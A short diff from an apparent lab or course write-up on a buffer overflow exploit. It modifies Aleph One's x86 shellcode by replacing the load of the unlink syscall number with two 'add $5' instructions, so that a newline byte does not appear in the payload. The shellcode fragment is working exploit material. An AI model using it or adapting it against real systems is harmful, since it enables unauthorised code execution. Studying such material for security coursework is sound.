@@ -142,7 +142,8 @@ For the buffer overflow exploit we were required to modify the Aleph One's shell
     	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
     	movl	%eax,(ENVP)(%esi)	/* set up null envp */
 
-    	movb	$SYS_unlink,%al		/* syscall arg 1: syscall for unlink */
+    	add     $5, %al         /* add 5 low bytes to avoid the unlink syscall, is 10 or '\n' (newline) */
+        add     $5, %al         /* add 5 low bytes to avoid the unlink syscall, is 10 or '\n' (newline) */
     	movl	%esi,%ebx		/* syscall arg 2: string pathname */
     	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
     	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
